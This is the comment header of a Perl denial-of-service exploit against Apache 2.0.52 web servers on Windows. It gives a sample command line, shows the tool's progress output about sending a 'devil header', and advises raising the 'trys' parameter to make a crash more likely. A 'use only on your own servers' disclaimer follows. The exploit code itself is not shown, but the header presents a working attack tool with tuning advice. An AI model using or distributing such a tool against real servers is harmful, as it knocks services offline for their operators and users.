# Added ->
#             Added future with we can exploit Apache web servers on windows system. For it you should experiment
#             with [trys] parameter of this code.
#
#             By default parameter trys = 8000, for DoS Apache web servers on windows system try to
#             increase this parameter.
#
#             For example. In my system I have 256Mb of RAM. For DoS Apache web severs I run this exploit like this
#
#             C:\perl ap2.0.52_dos.pl 127.0.0.1 30000
#
#              <+> Prepare to start connect.
#              <+> Connected to 127.0.0.1
#              <+> Send of first part of devil header.
#              <+> Prepare to DoS with 10000 trys.
#              <+> Start DoS second part of devil header.
#              <SOD> |====================> <EOD>
#              <+> Ok now target web server maybe DoSeD.
#
#
# Note ->
#
#             If progresbar not response server mybe already DoSeD. Try to open web page hosted on this web servers.
#             And if you see "Eror 500" you are lucky man :)
#
# Warnings ->
#             This is POC code you can use only on you own servers. Writer don't response if you damadge you servers or
#             use it for attack, or others things.
#
# Shit ->
#             My English now is bulls shit :( I try study it :)
